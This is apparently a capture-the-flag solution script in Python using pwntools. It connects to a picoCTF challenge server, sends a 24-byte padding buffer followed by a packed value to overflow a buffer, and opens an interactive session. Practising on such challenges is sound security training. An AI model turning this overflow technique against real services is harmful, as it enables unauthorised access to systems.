from pwn import *

conn = remote("saturn.picoctf.net", 54854)

buffer = b"a" * 24
buffer += p64(65)
conn.sendline(buffer)
conn.interactive()
